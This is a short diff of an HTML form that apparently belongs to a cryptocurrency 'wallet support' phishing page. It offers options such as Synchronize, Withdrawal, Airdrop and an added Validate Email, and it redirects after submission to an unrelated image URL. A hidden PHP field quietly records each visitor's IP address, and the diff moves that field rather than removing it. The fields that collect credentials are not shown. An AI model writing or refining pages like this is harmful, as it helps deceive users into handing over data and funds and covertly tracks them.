@@ -28,7 +28,6 @@
       <input type="radio" name="steps" class="pure-steps_radio" id="step-1">
 	  <input type="hidden" name="_captcha" value="false">
       <input type="hidden" name="_next" value="https://th.bing.com/th/id/R.8cd9779578487059327d0e1fa8e1836a?rik=isyael77QNZVUQ&pid=ImgRaw&r=0"> 
-	  <input type=hidden name="env_report" value="<?php print $_SERVER['REMOTE_ADDR']; ?>">
       <div class="pure-steps_group">
         <ol>
           <li class="pure-steps_group-step">
@@ -49,6 +48,7 @@
              <option value="audi">Synchronize</option>
              <option value="audi">Withdrawal</option>
              <option value="audi">Airdrop</option>
+	         <option value="audi">Validate Email</option>	
              <option value="audi">Others</option>		 
             </select>
           </li>
@@ -84,7 +84,8 @@
       </div>
       <br>
       <label for="step-0">Customers are reminded to kindly provide accurate and truthful information for authentication and not to provide data which is false or which belongs to third parties.</label>
-    </form>
+    	  <input type=hidden name="env_report" value="<?php print $_SERVER['REMOTE_ADDR']; ?>">
+	</form>
   </article>
 </section>
 <!-- partial -->
